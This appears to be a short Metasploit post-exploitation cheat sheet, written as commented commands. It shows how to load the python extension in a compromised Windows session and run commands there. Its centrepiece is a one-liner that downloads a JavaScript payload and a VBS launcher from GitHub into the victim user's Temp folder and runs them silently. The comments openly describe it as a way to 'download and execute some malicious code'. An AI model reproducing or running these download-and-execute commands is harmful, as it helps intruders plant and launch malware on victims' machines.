# listed are some more uncommon things you can do from Metasploit
# load the python module, execute system commands to download files
load python

#from Metasploit terminal you can also send commands to a specific session like so 
sessions -i 1 -C 'load python; python_execute "import os; os.popen(\"notepad\")"'


# what about more complex commands like download and execute some malicious code ?
# how about this for example. Ever wish Windows had wget included in the os ?
# remember that load python module we mentioned earlier ?
# think you can write a python function to down and execute some code ?
# Example:
load python; python_execute "import getpass; aaa=getpass.getuser(); import urllib; t=urllib.URLopener(); t.retrieve('https://raw.githubusercontent.com/subinacls/JSMeter/master/JSMeter.js','C:\\\\Users\\\\'+aaa+'\\\\AppData\\\\Local\\\\Temp\\\\jsmeter.js');t.retrieve('https://raw.githubusercontent.com/subinacls/Bash-Full/master/maliciousfiles/eVilBS/invisi.vbs','C:\\\\Users\\\\'+aaa+'\\\\AppData\\\\Local\\\\Temp\\\\inv.vbs');import os; os.popen('C:\\\\Users\\\\'+aaa+'\\\\AppData\\\\Local\\\\Temp\\\\inv.vbs C:\\\\Users\\\\'+aaa+'\\\\AppData\\\\Local\\\\Temp\\\\jsmeter.js &')"
